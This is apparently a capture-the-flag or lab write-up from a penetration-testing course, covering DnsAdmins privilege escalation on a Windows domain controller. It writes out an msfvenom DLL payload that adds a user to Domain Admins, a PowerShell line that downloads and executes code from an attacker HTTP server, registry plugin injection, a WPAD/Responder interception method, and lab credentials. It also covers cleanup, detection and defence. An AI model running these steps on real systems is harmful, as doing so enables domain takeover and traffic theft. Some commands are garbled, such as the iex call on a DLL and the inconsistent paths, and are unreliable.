# 🛰️ DnsAdmins Privilege Escalation

## 🔍 Overview

DnsAdmins is a built-in Windows group that provides extensive control over DNS services, including the ability to inject malicious DLL files into the DNS service via registry manipulation. This technique can be leveraged to escalate privileges on Domain Controllers and gain access to sensitive system resources.

[!WARNING] **This attack is destructive and must only be performed with explicit client permission due to its potential to disrupt DNS functionality across an entire domain.**

## 🏃‍♂️ Prerequisites

### 1. Verify DnsAdmins Membership
```cmd
# Check if the current user has DnsAdmins group membership
net localgroup "DnsAdmins" /domain

# Expected output:
The command completed successfully.
```

[!INFO] Ensure you are logged in as a user with DnsAdmins privileges.

## 🛠️ Exploitation Methodology

### 2. Generate Malicious DLL File
```bash
# Use Metasploit to create the malicious adduser.dll file
msfvenom -p windows/x64/exec cmd='net localgroup "Domain Admins" netadm /add' -f dll -o c:\Users\redteam\adduser.dll

# Verify the DLL file has been created correctly
dir c:\Users\redteam\adduser.dll

# Expected output:
File Name: adduser.dll
Size: 8704 bytes
```

### 3. Host Malicious DLL via HTTP Server
```python
# Start an HTTP server to host the malicious DLL file
python -m http.server 7777 --directory C:\Users\redteam

# The output should confirm that the server is running and serving files from the specified directory.
```

[!INFO] Ensure the HTTP server is accessible by the DNS service.

### 4. Configure Registry Key to Load Malicious DLL
```cmd
# Download the malicious DLL file via WGET (requires admin privileges)
powershell -c "iex (wget http://[IP]:7777/adduser.dll -UseBasicParsing).Content"

# Verify that the adduser.dll is present on the system
dir c:\Users\netadm\adduser.dll

# Expected output:
File Name: adduser.dll
Size: 8704 bytes
```

### 5. Restart DNS Service to Load Malicious DLL
```cmd
# Stop the DNS service (requires administrative privileges)
sc.exe stop dns

# Start the DNS service with the malicious DLL configured in the registry
dnscmd /config /serverlevelplugindll "c:\Users\netadm\adduser.dll"

# Restart the DNS service to trigger execution of adduser.dll
net start dns

# Confirm that the command completed successfully
```

### 6. Verify Privilege Escalation
```cmd
# Check Domain Admins group membership
net group "Domain Admins" /dom

# Expected result (netadm should be added):
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

### 7. Sign Out and Reconnect
```bash
# Sign out from current RDP session to refresh permissions
# Reconnect with same credentials
xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'

# This step is important to refresh the session with new Domain Admin privileges
```

### 8. Access Administrator Desktop and Retrieve Flag
```cmd
# Open Command Prompt with Domain Admin privileges
# Access the flag file
type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt

# Submit the flag content to HTB Academy
```

## 🧹 Cleanup and Restoration

[!WARNING] This is a destructive attack. Ensure you have explicit permission from the client before proceeding.

### Verify Registry Key
```cmd
# Check if ServerLevelPluginDll key exists
reg query \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Look for:
ServerLevelPluginDll    REG_SZ    adduser.dll
```

### Remove Registry Key
```cmd
# Delete the malicious registry entry
reg delete \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

# Confirm deletion:
Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The command completed successfully.
```

### Service Restoration
```cmd
# Restart DNS service cleanly
sc.exe start dns

# Verify service is running
sc query dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
```

### DNS Functionality Test
```cmd
# Test DNS resolution
nslookup localhost
nslookup domain.com

# Verify DNS is working correctly
```

## 🌐 WPAD Attack Alternative

[!INFO] The Global Query Block List manipulation can be used to disable the block list, and create a WPAD record pointing to your attack machine.

### Disable Global Query Block
```powershell
# Disable global query block list
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Create WPAD Record
```powershell
# Add WPAD record pointing to attack machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

### Traffic Interception
```bash
# Set up Responder for traffic capture
responder -I eth0 -A

# Alternative: Use Inveigh
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y
```

## 🔍 Detection Indicators

### Registry Monitoring
```cmd
# Monitor for registry changes:
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll

# Event IDs to watch:
Event ID 4657 - Registry value modified
Event ID 4656 - Handle to object requested
```

### Service Activity
```cmd
# Suspicious activities:
- DNS service stops/starts outside maintenance windows
- dnscmd.exe execution by non-administrative users
- Custom DLL files in DNS-related directories
- Network connections from DNS service process
```

### Network Indicators
```cmd
# Traffic patterns:
- HTTP requests for DLL files from Domain Controllers
- SMB connections to unusual shares
- DNS queries to non-standard records (WPAD)
```

## 🛡️ Defense Strategies

[!INFO] Regular audits of the DnsAdmins group membership can help mitigate unauthorized access and privilege escalation attempts.

### Group Membership Hardening
```cmd
# Regular audits:
- Review DnsAdmins group membership quarterly
- Remove unnecessary accounts
- Implement least-privilege principles
- Use dedicated DNS management accounts
```

### DNS Service Protection
```cmd
# Security measures:
- Enable DNS audit logging
- Monitor ServerLevelPluginDll registry key
- Implement application whitelisting
- Restrict DNS service permissions
```

### Detection Rules
```cmd
# Deploy monitoring for:
- DnsAdmins group modifications
- dnscmd.exe execution
- DNS service restart events
- Custom DLL loading by DNS service
```

## 📋 DnsAdmins Exploitation Checklist

### Prerequisites
- [ ] **DnsAdmins membership** verified
- [ ] **DNS service permissions** confirmed (RPWP)
- [ ] **Domain Controller access** available
- [ ] **Client permission** obtained for destructive testing

### DLL Generation
- [ ] **Malicious DLL created** (msfvenom or custom)
- [ ] **Payload tested** in lab environment
- [ ] **Hosting method** prepared (HTTP/SMB)
- [ ] **Full path** available for DLL specification

### Service Exploitation
- [ ] **Registry key configured** (`dnscmd /config /serverlevelplugindll`)
- [ ] **DNS service stopped** (`sc stop dns`)
- [ ] **DNS service started** (`sc start dns`)
- [ ] **Privilege escalation verified** (group membership/access)

### Flag Retrieval
- [ ] **Administrator access** confirmed
- [ ] **Flag file accessed** (`c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`)
- [ ] **Flag content** extracted and submitted

### Cleanup
- [ ] **Registry key removed** (ServerLevelPluginDll)
- [ ] **DNS service restored** (clean restart)
- [ ] **DNS functionality verified** (nslookup tests)
- [ ] **Changes documented** for client reporting

## 💡 Key Takeaways

1. **DnsAdmins membership** enables SYSTEM-level code execution on DNS servers.
2. **Custom DLL injection** through ServerLevelPluginDll registry key is a powerful attack vector.
3. **DNS service restart** required to trigger malicious DLL loading.
4. **Full path specification** mandatory for successful exploitation.
5. **Destructive nature** requires careful coordination with client.
6. **Domain Controller impact** - DNS disruption affects entire domain.
7. **Multiple attack vectors** - user addition, reverse shells, WPAD attacks.
8. **Cleanup essential** - registry restoration and service stability.

---